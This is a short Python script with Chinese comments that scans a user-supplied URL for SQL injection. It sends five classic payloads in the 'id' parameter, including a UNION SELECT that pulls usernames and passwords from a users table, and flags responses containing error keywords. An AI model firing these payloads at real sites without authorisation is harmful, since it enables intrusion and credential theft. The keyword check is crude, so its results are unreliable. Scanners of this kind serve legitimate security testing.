import requests

# 常见的SQL注入负载
payloads = [
    "' OR '1'='1'; --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1--",
    "' UNION SELECT null, username, password FROM users --",
]

def scan_sql_injection(url):
    for payload in payloads:
        # 构建包含payload的URL
        test_url = f"{url}?id={payload}"
        
        try:
            response = requests.get(test_url)
            
            # 检查响应内容
            # 可以根据应用程序的特定行为来判断是否存在SQL注入
            if "error" in response.text or "mysql" in response.text or "SQL" in response.text:
                print(f"潜在的SQL注入漏洞: {test_url}")
            else:
                print(f"没有检测到漏洞: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"请求错误: {e}")

if __name__ == "__main__":
    target_url = input("请输入要扫描的 URL: ")
    scan_sql_injection(target_url)
    print(f"扫描完毕！共发现以上几个可能存在的漏洞")